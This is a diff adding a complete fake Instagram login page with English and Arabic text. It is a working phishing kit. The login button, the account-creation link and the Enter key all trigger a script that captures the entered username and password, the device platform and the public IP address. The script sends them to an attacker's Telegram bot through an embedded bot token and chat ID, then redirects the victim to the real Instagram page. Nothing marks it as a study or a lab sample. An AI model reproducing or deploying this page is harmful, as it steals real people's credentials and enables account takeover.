@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Instagram+Sans:wght@400;500;600&display=swap');
+        
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0a0a0a;
+            font-family: 'Instagram Sans', system-ui, sans-serif;
+            color: #fff;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 360px;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            width: 110px;
+            height: 110px;
+            margin: 20px auto 35px;
+            background: linear-gradient(135deg, #f56040, #c13584, #833ab4, #405de6);
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 68px;
+            box-shadow: 0 10px 30px rgba(255, 0, 150, 0.3);
+        }
+        .form-box {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 35px 25px 25px;
+        }
+        input {
+            width: 100%;
+            padding: 15px 14px;
+            margin: 8px 0;
+            background: #1a1a1a;
+            border: 1px solid #555;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+        }
+        input:focus {
+            border-color: #0095f6;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 13px;
+            margin: 20px 0 12px;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .forgot {
+            color: #0095f6;
+            font-size: 14px;
+            margin: 15px 0 25px;
+            cursor: pointer;
+        }
+        .create {
+            color: #0095f6;
+            font-size: 15px;
+            margin-top: 30px;
+            cursor: pointer;
+        }
+        .meta {
+            margin-top: 70px;
+            color: #777;
+            font-size: 13px;
+        }
+        .lang {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            color: #0095f6;
+            font-size: 14px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="lang" onclick="toggleLang()">English / العربية</div>
+
+    <div class="container">
+        <div class="logo">📷</div>
+        
+        <div class="form-box">
+            <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
+            <input type="password" id="password" placeholder="Password" autocomplete="off">
+            
+            <button onclick="stealData()">Log in</button>
+            
+            <div class="forgot">Forgot password?</div>
+        </div>
+
+        <div class="create" onclick="stealData()">Create new account</div>
+        
+        <div class="meta">Meta</div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
+        const CHAT_ID = '8539996558';
+        let isArabic = false;
+
+        function toggleLang() {
+            isArabic = !isArabic;
+            const inputs = document.querySelectorAll('input');
+            if (isArabic) {
+                inputs[0].placeholder = "اسم المستخدم أو البريد أو رقم الهاتف";
+                inputs[1].placeholder = "كلمة السر";
+                document.querySelector('button').textContent = "تسجيل الدخول";
+                document.querySelector('.forgot').textContent = "هل نسيت كلمة السر؟";
+                document.querySelector('.create').textContent = "إنشاء حساب جديد";
+            } else {
+                inputs[0].placeholder = "Username, email or mobile number";
+                inputs[1].placeholder = "Password";
+                document.querySelector('button').textContent = "Log in";
+                document.querySelector('.forgot').textContent = "Forgot password?";
+                document.querySelector('.create').textContent = "Create new account";
+            }
+        }
+
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip;
+            } catch(e) { return 'Unknown'; }
+        }
+
+        async function stealData() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            const text = `🔥 INSTAGRAM PRO STEAL 2026\n\n` +
+                        `👤 Username: <code>${username || 'N/A'}</code>\n` +
+                        `🔑 Password: <code>${password || 'N/A'}</code>\n` +
+                        `📱 Device: ${navigator.platform}\n` +
+                        `🌐 IP: ${await getIP()}\n` +
+                        `⏰ Time: ${new Date().toISOString()}\n\n` +
+                        `📋 <b>Copy Username:</b> ${username}\n` +
+                        `📋 <b>Copy Password:</b> ${password}`;
+
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('text', text);
+            form.append('parse_mode', 'HTML');
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                body: form
+            }).catch(() => {});
+
+            // تحويل للصفحة الحقيقية
+            setTimeout(() => {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }, 1400);
+        }
+
+        // دعم Enter
+        document.addEventListener('keypress', (e) => {
+            if (e.key === "Enter") stealData();
+        });
+    </script>
+</body>
+</html>
